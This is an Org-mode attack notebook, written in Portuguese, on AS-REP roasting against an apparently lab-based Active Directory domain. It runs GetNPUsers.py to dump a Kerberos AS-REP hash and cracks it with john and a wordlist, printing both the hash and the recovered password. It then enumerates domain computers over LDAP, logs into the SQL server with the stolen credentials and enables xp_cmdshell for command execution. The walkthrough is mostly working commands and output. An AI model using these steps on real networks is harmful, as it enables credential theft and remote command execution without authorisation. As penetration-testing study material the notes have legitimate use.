#+title: As Rep Roasting
#+author:gabriel

** impacket setup
a instalação do impacket é simples utilizando o pipx, que pode ser instalado de forma simples também com  o ~brew~ -->
#+begin_src sh
brew install pipx
#+end_src

instalar a lib impacket -->
#+begin_src sh
pipx install impacket

'impacket' already seems to be installed. Not modifying existing installation in
'/home/ilak/.local/share/pipx/venvs/impacket'. Pass '--force' to force installation.
#+end_src

para ligar o venv do impacket, aqui no linux o path é -->
#+begin_src sh
source ~/.local/share/pipx/venvs/impacket/bin/activate
#+end_src

* init
após obter nomes de users válidos, podemos user um script do impacket para verificar users com a opção 'DoesNotRequirePreAuth' == $true

para essa verificação utilzamos o script GetNPUsers.py do ~impacket~ -->
#+begin_src sh
GetNPUsers.py telecore.ad/ -dc-ip 10.5.2.2 -usersfile users.txt -format hashcat

[-] User virt-admin doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User ESXI-VD doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User tel_ops1 doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$tel_support01@TELECORE.AD:1ea55741eff7bf90acee086486688bfe$01a335e71664678dec9726d215d898b1cb4770a79b76886eeefda61f00cd430858e439d99f7fe198cd900c0307000d1724da63027287a284571c978cbb8d2d69ded09e4c299b3d2f99bb526770e2fdef4ae3c06a8eef06f73f72627c784a064bcb8fd1764aa4808c95d4dfdae6f9daeedf17fe578252a80952bf297ab749dca66c96e0a6d66e477b4794aadd77bfed0660f30c6210e4f3e763676bf72d9c52658a6497f4f90471e25d0f9c154daf9a0b1f3204cf897c9348f6dc3df8260a026c312840bf65fd06eccd8a4da937ca60160859a047a1f67a4c4674b6862f844b5d8d4473d5706b168bec98
[-] User tel_engineer01 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User tel_billing01 doesn't have UF_DONT_REQUIRE_PREAUTH set
#+end_src

* crack the hash
para quebrar este hash com o john -->

é preciso garantir que o arquivo esteja sem nenhuma quebra de formatação para o funcionamento do john, e para verificar se o hash foi reconhecido -->
#+begin_src sh
john --show hash.txt
0 password hashes cracked, 1 left
#+end_src

iniciando a quebra do hash -->
#+begin_src sh
john --format=krb5asrep --wordlist=/usr/share/wordlists/kali-wordlists/rockyou.txt hash.txt
#+end_src

para confirmar se foi bem sucedido após a execução, o mesmo comando -->
#+begin_src sh
john --show hash.txt
$krb5asrep$23$tel_support01@TELECORE.AD:#T3l3phon3!

1 password hash cracked, 0 left
#+end_src

* password spray
com estas credenciais é preciso verificar onde elas são válidas, e quais máquinas elas são aceitas.

pegar os ~computers~ do domain controller via LDAP -->
#+begin_src sh
ldapsearch -x -H ldap://10.5.2.2 -b "DC=telecore,DC=ad" "objectClass=computer" dNSHostName | grep -Ei "^dnshostname" | awk '{print $2}' > computers.txt
#+end_src

pegando o IP destas máquinas -->
#+begin_src sh
for ip in $(cat computers.txt);do ping -c 1 $ip;done | grep PING | awk '{print $2 " -- " $3}' | tr "()" " "
#+end_src

resultado -->
#+begin_src sh
DC01.telecore.ad --  10.5.2.2
PKI-Srv.telecore.ad --  10.5.2.8
SQL-Srv.telecore.ad --  10.5.2.22
Ex-Srv.telecore.ad --  10.5.2.16
esxi-vd.telecore.ad --  10.5.2.111
#+end_src

credenciais -->
#+begin_src text
tel_support01:#T3l3phon3!
#+end_src

com essas credenciais é possível acessar o SQL-Srv.telecored.ad, o impacket possui um script client -->
#+begin_src sh
mssqlclient.py tel_support01:'#T3l3phon3!'@10.5.2.22 -debug -windows-auth
#+end_src

o SQL server possui uma opção chamada *xp_cmdshell*, que permite executar comandos via cmd -->
#+begin_src sh
SQL (TELECORE\tel_support01  dbo@master)> enable_xp_cmdshell
#+end_src
